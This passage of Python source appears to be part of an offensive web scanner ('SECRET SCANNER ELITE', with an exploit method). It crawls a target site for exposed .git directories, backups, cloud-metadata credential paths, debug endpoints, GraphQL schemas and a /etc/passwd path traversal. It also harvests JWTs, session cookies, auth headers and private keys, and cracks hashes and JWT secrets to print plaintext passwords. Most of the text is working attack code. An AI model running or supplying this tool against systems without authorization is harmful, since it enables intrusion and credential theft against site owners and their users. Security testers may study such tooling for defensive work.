        opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))

        all_findings = []
        visited = set()
        scanned = [0]

        print(f"\n{'='*60}")
        print(f"  SECRET SCANNER ELITE v3.0")
        print(f"  Target: {base_url}")
        print(f"{'='*60}\n")

        def fetch(url: str, headers_only: bool = False) -> tuple[str, str | None, int, dict]:
            if url in visited:
                return url, None, 0, {}
            visited.add(url)
            scanned[0] += 1
            try:
                req = urllib.request.Request(url)
                req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                resp = opener.open(req, timeout=timeout)
                body = resp.read(200000).decode("utf-8", "replace") if not headers_only else ""
                return url, body, resp.status, dict(resp.headers)
            except urllib.request.HTTPError as e:
                return url, None, e.code, dict(e.headers) if hasattr(e, 'headers') else {}
            except Exception:
                return url, None, 0, {}

        def scan_content(url: str, body: str, headers: dict) -> list[dict]:
            findings = []

            # Header analysis
            interesting_headers = {
                "X-Powered-By", "Server", "X-AspNet-Version", "X-AspNetMvc-Version",
                "X-Debug-Token", "X-Debug-Token-Link", "X-Runtime", "X-Request-Id",
                "X-Debug", "X-SourceMap", "X-Protected-By", "X-Frame-Options",
                "Strict-Transport-Security", "Content-Security-Policy",
            }
            for h_name, h_val in headers.items():
                if h_name.lower() in {x.lower() for x in interesting_headers}:
                    if h_name.lower() in ("x-powered-by", "server", "x-aspnet-version", "x-aspnetmvc-version"):
                        findings.append({"type": "header_leak", "value": f"{h_name}: {h_val}", "url": url, "severity": "MEDIUM"})

            # Cookie analysis
            for h_name, h_val in headers.items():
                if h_name.lower() == "set-cookie":
                    if any(s in h_val.lower() for s in ["session", "token", "auth", "jwt", "sid"]):
                        findings.append({"type": "cookie_session", "value": h_val[:200], "url": url, "severity": "MEDIUM"})

            # Pattern matching
            for pname, pattern in PATTERNS.items():
                matches = pattern.findall(body)
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0] if match[0] else (match[1] if len(match) > 1 else "")
                    if not match or len(match) < 3:
                        continue
                    if match.lower() in ("example", "test", "xxx", "none", "null", "undefined", "placeholder", "dummy"):
                        continue

                    finding = {"type": pname, "value": match[:300], "url": url}

                    # Hash cracking
                    if pname in ("md5_hash", "sha1_hash", "sha256_hash", "sha512_hash") and crack:
                        analysis = analyze_hash(match)
                        finding["hash_type"] = analysis["type"]
                        if analysis["cracked"]:
                            finding["cracked"] = analysis["cracked"]
                            finding["type"] = f"{analysis['type'].lower()}_CRACKED"
                            finding["severity"] = _severity_for(finding["type"])

                    # JWT deep analysis
                    if pname == "jwt_token":
                        jwt = decode_jwt(match)
                        if jwt:
                            finding.update({
                                "jwt_header": jwt["header"],
                                "jwt_payload": jwt["payload"],
                                "jwt_algorithm": jwt["algorithm"],
                                "jwt_kid": jwt.get("kid", ""),
                                "jwt_vulnerabilities": jwt["vulnerabilities"],
                                "jwt_secrets": jwt["secrets_in_payload"],
                            })
                            if jwt["algorithm"].startswith("HS") and crack_jwt:
                                print(f"  [*] JWT found ({jwt['algorithm']}) — cracking...")
                                secret = crack_jwt_secret(match)
                                if secret:
                                    finding["jwt_secret_cracked"] = secret
                                    finding["type"] = "jwt_CRACKED"
                                    finding["severity"] = "CRITICAL"
                                    print(f"  [!] JWT SECRET CRACKED: {secret}")
                            if any("alg=none" in v for v in jwt["vulnerabilities"]):
                                finding["severity"] = "CRITICAL"
                                finding["type"] = "jwt_ALG_NONE"

                    # Base64 decode
                    if pname == "base64_long" and decode_b64:
                        decoded = decode_base64(match)
                        if decoded and len(decoded) > 20:
                            finding["decoded"] = decoded[:500]
                            finding["type"] = "base64_decoded"

                    # Private key
                    if "private_key" in pname.lower() or "PRIVATE KEY" in match:
                        finding["type"] = "private_key"
                        finding["severity"] = "CRITICAL"

                    finding["severity"] = _severity_for(finding["type"])

                    findings.append(finding)

            return findings

        # =====================================================================
        # PHASE 1: SENSITIVE PATHS
        # =====================================================================
        print("[Phase 1/12] Sensitive path discovery...")
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(fetch, base_url + p): p for p in SENSITIVE_PATHS}
            for f in as_completed(futures):
                url, body, status, headers = f.result()
                if body and status == 200:
                    if any(x in url.lower() for x in exclude):
                        continue
                    print(f"  [+] {url} ({len(body)} bytes)")
                    all_findings.extend(scan_content(url, body, headers))

        # =====================================================================
        # PHASE 2: VERSION CONTROL EXPLOITATION
        # =====================================================================
        if check_git:
            print("\n[Phase 2/12] VCS repository exploitation...")
            vcs_paths = ["/.git/HEAD", "/.git/config", "/.git/index", "/.git/logs/HEAD",
                         "/.svn/entries", "/.svn/wc.db", "/.hg/store/00manifest.i"]
            for vp in vcs_paths:
                url, body, status, _ = fetch(base_url + vp)
                if body and status == 200:
                    print(f"  [!] VCS EXPOSED: {vp}")
                    f = {"type": "vcs_exposed", "value": body[:500], "url": url, "severity": "CRITICAL"}
                    if "ref:" in body:
                        f["branch"] = body.strip().split("/")[-1]
                    all_findings.append(f)

        # =====================================================================
        # PHASE 3: CLOUD METADATA
        # =====================================================================
        if check_cloud:
            print("\n[Phase 3/12] Cloud metadata extraction...")
            cloud_paths = [
                "/latest/meta-data/", "/latest/meta-data/iam/security-credentials/",
                "/latest/meta-data/hostname", "/latest/meta-data/local-ipv4",
                "/latest/meta-data/public-keys/",
                "/computeMetadata/v1/", "/computeMetadata/v1/instance/service-accounts/default/token",
                "/metadata/instance?api-version=2021-02-01",
            ]
            for cp in cloud_paths:
                url, body, status, _ = fetch(base_url + cp)
                if body and status == 200:
                    print(f"  [!] CLOUD METADATA: {cp}")
                    all_findings.append({"type": "cloud_metadata", "value": body[:500], "url": url, "severity": "CRITICAL"})

        # =====================================================================
        # PHASE 4: CORS / WEBDAV / SECURITY HEADERS
        # =====================================================================
        if check_cors:
            print("\n[Phase 4/12] CORS, WebDAV, and security headers...")
            # CORS
            try:
                req = urllib.request.Request(base_url)
                req.add_header("Origin", "https://evil.com")
                resp = opener.open(req, timeout=timeout)
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                if acao in ("*", "https://evil.com"):
                    print(f"  [!] CORS: Origin={acao} Credentials={acac}")
                    all_findings.append({"type": "cors_misconfig", "value": f"ACAO={acao} ACAC={acac}", "url": base_url, "severity": "HIGH"})
            except Exception:
                pass

            # WebDAV
            try:
                req = urllib.request.Request(base_url)
                req.method = "OPTIONS"
                resp = opener.open(req, timeout=timeout)
                allow = resp.headers.get("Allow", "")
                if any(m in allow for m in ["PUT", "DELETE", "MKCOL", "PROPFIND"]):
                    print(f"  [!] WEBDAV: {allow}")
                    all_findings.append({"type": "webdav_enabled", "value": f"Methods: {allow}", "url": base_url, "severity": "HIGH"})
            except Exception:
                pass

            # Security headers check
            try:
                _, _, _, headers = fetch(base_url)
                missing = []
                for h in ["Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options", "Content-Security-Policy"]:
                    if h.lower() not in {k.lower() for k in headers}:
                        missing.append(h)
                if missing:
                    all_findings.append({"type": "missing_security_headers", "value": f"Missing: {', '.join(missing)}", "url": base_url, "severity": "LOW"})
            except Exception:
                pass

        # =====================================================================
        # PHASE 5: BACKUP FILES & SOURCE DISCLOSURE
        # =====================================================================
        print("\n[Phase 5/12] Backup files and source code disclosure...")
        common_names = ["config", "database", "db", "backup", "dump", "www", "site", "admin", "wp-config", "settings"]
        backup_paths = []
        for name in common_names:
            for ext in BACKUP_EXTENSIONS[:15]:
                backup_paths.append(f"/{name}{ext}")
                backup_paths.append(f"/backups/{name}{ext}")

        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(fetch, base_url + p): p for p in backup_paths[:150]}
            for f in as_completed(futures):
                url, body, status, _ = f.result()
                if body and status == 200 and len(body) > 50:
                    if any(x in url.lower() for x in exclude):
                        continue
                    print(f"  [!] BACKUP: {url} ({len(body)} bytes)")
                    all_findings.append({"type": "backup_file", "value": f"{url} ({len(body)} bytes)", "url": url, "severity": "HIGH"})
                    all_findings.extend(scan_content(url, body, {}))

        # =====================================================================
        # PHASE 6: JAVASCRIPT DEEP ANALYSIS
        # =====================================================================
        if check_js:
            print("\n[Phase 6/12] JavaScript deep analysis...")
            js_urls = set()

            # Find JS files from crawl
            crawl_queue = [base_url]
            while crawl_queue and len(visited) < 30:
                url = crawl_queue.pop(0)
                if url in visited:
                    continue
                _, body, status, _ = fetch(url)
                if body and status == 200:
                    for m in re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', body):
                        jsu = urljoin(url, m)
                        if jsu.startswith(base_url):
                            js_urls.add(jsu)
                    for m in re.findall(r'href=["\']([^"\'#]+)["\']', body):
                        full = urljoin(url, m)
                        if full.startswith(base_url) and full not in visited:
                            crawl_queue.append(full)

            # Add known JS paths
            for jp in JS_PATHS:
                js_urls.add(base_url + jp)

            # Scan JS files
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(fetch, u): u for u in list(js_urls)[:40]}
                for f in as_completed(futures):
                    url, body, status, _ = f.result()
                    if body and status == 200:
                        print(f"  [*] JS: {url} ({len(body)} bytes)")
                        all_findings.extend(scan_content(url, body, {}))

                        # Source map check
                        if body.endswith("//# sourceMappingURL=") or "sourceMappingURL=" in body:
                            map_match = re.search(r'sourceMappingURL=([^\s]+)', body)
                            if map_match:
                                map_url = urljoin(url, map_match.group(1))
                                print(f"  [!] SOURCE MAP: {map_url}")
                                all_findings.append({"type": "source_map", "value": map_url, "url": url, "severity": "MEDIUM"})

                        # Webpack config extraction
                        webpack_match = re.search(r'(?:webpackJsonp|__webpack_require__|webpackChunk)\s*[\[(]', body)
                        if webpack_match:
                            print(f"  [*] Webpack bundle detected")

        # =====================================================================
        # PHASE 7: GRAPHQL INTROSPECTION
        # =====================================================================
        if check_graphql:
            print("\n[Phase 7/12] GraphQL introspection...")
            graphql_paths = ["/graphql", "/graphiql", "/graphql/console", "/api/graphql", "/v1/graphql"]
            introspection_query = '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

            for gp in graphql_paths:
                try:
                    req = urllib.request.Request(base_url + gp, data=introspection_query.encode(), method="POST")
                    req.add_header("Content-Type", "application/json")
                    req.add_header("User-Agent", "Mozilla/5.0")
                    resp = opener.open(req, timeout=timeout)
                    body = resp.read(100000).decode("utf-8", "replace")
                    if "__schema" in body or "types" in body:
                        print(f"  [!] GRAPHQL INTROSPECTION: {gp}")
                        schema = json.loads(body)
                        types = [t["name"] for t in schema.get("data", {}).get("__schema", {}).get("types", [])]
                        all_findings.append({"type": "graphql_introspection", "value": f"Endpoint: {gp}\nTypes: {', '.join(types[:20])}", "url": base_url + gp, "severity": "MEDIUM"})

                        # Check for sensitive types
                        sensitive_types = [t for t in types if any(s in t.lower() for s in ["user", "admin", "auth", "token", "password", "secret", "credential"])]
                        if sensitive_types:
                            all_findings.append({"type": "graphql_sensitive_types", "value": f"Sensitive types: {', '.join(sensitive_types)}", "url": base_url + gp, "severity": "HIGH"})
                except Exception:
                    pass

        # =====================================================================
        # PHASE 8: ERROR PAGES & DEBUG ENDPOINTS
        # =====================================================================
        print("\n[Phase 8/12] Error pages and debug endpoints...")
        debug_paths = ["/debug", "/trace", "/actuator", "/actuator/env",
                       "/actuator/configprops", "/metrics", "/debug/default",
                       "/debug/vars", "/__debug__/", "/elmah.axd",
                       "/favicon.ico?debug=1", "/?debug=1", "/?test=1"]
        error_triggers = ["/nonexistent_xyz_404", "/%00", "/../../../etc/passwd"]

        for dp in debug_paths + error_triggers:
            url, body, status, headers = fetch(base_url + dp)
            if body:
                # Debug endpoints
                if status == 200 and any(s in body.lower() for s in ["env", "properties", "beans", "trace", "health", "metrics", "configprops"]):
                    print(f"  [!] DEBUG ENDPOINT: {dp}")
                    all_findings.append({"type": "debug_endpoint", "value": body[:500], "url": url, "severity": "HIGH"})

                # Error page info leakage
                if status >= 400:
                    if any(s in body.lower() for s in ["stack trace", "traceback", "exception", "stacktrace", "debug"]):
                        print(f"  [!] ERROR LEAK: {dp}")
                        all_findings.append({"type": "error_info_leak", "value": body[:500], "url": url, "severity": "MEDIUM"})

                # Path traversal
                if status == 200 and ("root:" in body or "/bin/bash" in body):
                    print(f"  [!] PATH TRAVERSAL: {dp}")
                    all_findings.append({"type": "path_traversal", "value": body[:500], "url": url, "severity": "CRITICAL"})

        # =====================================================================
        # PHASE 9: WEBSOCKETS & HIDDEN SERVICES
        # =====================================================================
        if check_ws:
            print("\n[Phase 9/12] WebSocket and hidden service detection...")
            # Check for WebSocket upgrade
            try:
                req = urllib.request.Request(base_url)
                req.add_header("Upgrade", "websocket")
                req.add_header("Connection", "Upgrade")
                req.add_header("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==")
                req.add_header("Sec-WebSocket-Version", "13")
                resp = opener.open(req, timeout=5)
                if resp.status == 101:
                    print(f"  [!] WEBSOCKET: {base_url}")
                    all_findings.append({"type": "websocket", "value": f"WebSocket endpoint: {base_url}", "url": base_url, "severity": "MEDIUM"})
            except Exception:
                pass

            # Check common WebSocket paths
            ws_paths = ["/ws", "/socket", "/socket.io/", "/signalr", "/hub", "/ws/", "/websocket"]
            for wp in ws_paths:
                url, body, status, _ = fetch(base_url + wp)
                if body and status in (101, 200) and len(body) < 1000:
                    if any(s in body.lower() for s in ["websocket", "socket.io", "upgrade"]):
                        print(f"  [!] WEBSOCKET: {wp}")
                        all_findings.append({"type": "websocket", "value": f"WebSocket: {wp}", "url": url, "severity": "MEDIUM"})

        # =====================================================================
        # PHASE 10: JWT ELITE ANALYSIS
        # =====================================================================
        print("\n[Phase 10/12] JWT elite analysis...")
        # Already handled in scan_content, but let's check specific JWT endpoints
        jwt_endpoints = ["/.well-known/jwks.json", "/oauth/token", "/auth/token", "/api/token"]
        for jep in jwt_endpoints:
            url, body, status, _ = fetch(base_url + jep)
            if body and status == 200:
                print(f"  [+] JWT ENDPOINT: {jep}")
                try:
                    jwks = json.loads(body)
                    if "keys" in jwks:
                        all_findings.append({"type": "jwks_endpoint", "value": f"Keys: {len(jwks['keys'])}", "url": url, "severity": "INFO"})
                except json.JSONDecodeError:
                    pass

        # =====================================================================
        # PHASE 11: HASH CRACKING (already in scan_content)
        # =====================================================================
        print("\n[Phase 11/12] Hash analysis (already processed)...")

        # =====================================================================
        # PHASE 12: REAL-TIME SECRET EXTRACTION
        # =====================================================================
        print("\n[Phase 12/12] Real-time secret extraction...")
        # Deep scan all visited pages for additional patterns
        for url in list(visited)[:50]:
            try:
                req = urllib.request.Request(url)
                req.add_header("User-Agent", "Mozilla/5.0")
                resp = opener.open(req, timeout=timeout)
                # Check for authorization headers in response
                for h in resp.headers:
                    if h.lower() in ("authorization", "x-api-key", "x-auth-token"):
                        val = resp.headers[h]
                        print(f"  [!] AUTH HEADER: {url} → {h}: {val[:50]}")
                        all_findings.append({"type": "auth_header_leak", "value": f"{h}: {val}", "url": url, "severity": "HIGH"})
            except Exception:
                pass

        # =====================================================================
        # DEDUPLICATE & PRINT RESULTS
        # =====================================================================
        seen = set()
        unique = []
        for f in all_findings:
            key = (f["type"], f["value"][:50], f["url"])
            if key not in seen:
                seen.add(key)
                unique.append(f)

        by_type = {}
        for f in unique:
            t = f["type"]
            if t not in by_type:
                by_type[t] = []
            by_type[t].append(f)

        print(f"\n{'='*70}")
        print(f"  ELITE SECRET SCAN RESULTS")
        print(f"{'='*70}")

        # Sort by severity
        sorted_types = sorted(by_type.keys(), key=lambda x: SEVERITY_ORDER.get(_severity_for(x), 4))

        for ftype in sorted_types:
            items = by_type[ftype]
            sev = _severity_for(ftype)
            color = {"CRITICAL": "\033[91m", "HIGH": "\033[93m", "MEDIUM": "\033[96m", "LOW": "\033[90m", "INFO": "\033[90m"}.get(sev, "")

            print(f"\n{'─'*60}")
            print(f"  {color}[{sev}]\033[0m {ftype.upper()} ({len(items)} found)")
            print(f"{'─'*60}")

            for item in items[:15]:
                print(f"  Value: {item['value'][:120]}")
                print(f"  Source: {item['url']}")
                if item.get("cracked"):
                    print(f"  \033[92m[CRACKED]\033[0m Password: {item['cracked']}")
                if item.get("decoded"):
                    print(f"  Decoded: {item['decoded'][:150]}")
                if item.get("hash_type"):
                    print(f"  Hash Type: {item['hash_type']}")
                if item.get("jwt_algorithm"):
                    print(f"  JWT: {item['jwt_algorithm']} | Header: {item.get('jwt_header', {})}")
                    print(f"  Payload: {item.get('jwt_payload', {})}")
                if item.get("jwt_vulnerabilities"):
                    for v in item["jwt_vulnerabilities"]:
                        print(f"  \033[91m[VULN]\033[0m {v}")
                if item.get("jwt_secrets"):
                    for s in item["jwt_secrets"]:
                        print(f"  \033[93m[SECRET]\033[0m {s}")
                if item.get("jwt_secret_cracked"):
                    print(f"  \033[92m[JWT SECRET CRACKED]\033[0m {item['jwt_secret_cracked']}")
                if item.get("branch"):
                    print(f"  Branch: {item['branch']}")
                print()

        total = len(unique)
        critical = sum(1 for f in unique if (f.get("severity") or _severity_for(f["type"])) == "CRITICAL")
        high = sum(1 for f in unique if (f.get("severity") or _severity_for(f["type"])) == "HIGH")
        cracked = sum(1 for f in unique if f.get("cracked") or f.get("jwt_secret_cracked"))

        print(f"\n{'='*70}")
        print(f"  ELITE SCAN SUMMARY")
        print(f"{'='*70}")
        print(f"  Total findings:      {total}")
        print(f"  Critical:            {critical}")
        print(f"  High:                {high}")
        print(f"  Secrets cracked:     {cracked}")
        print(f"  Pages scanned:       {scanned[0]}")
        print(f"  Phases executed:     12")
        print(f"  Patterns matched:    {len(PATTERNS)}")
        print(f"{'='*70}\n")

        return {"findings": unique, "total": total, "critical": critical, "high": high, "cracked": cracked}

    def exploit(self):
        return self.run()
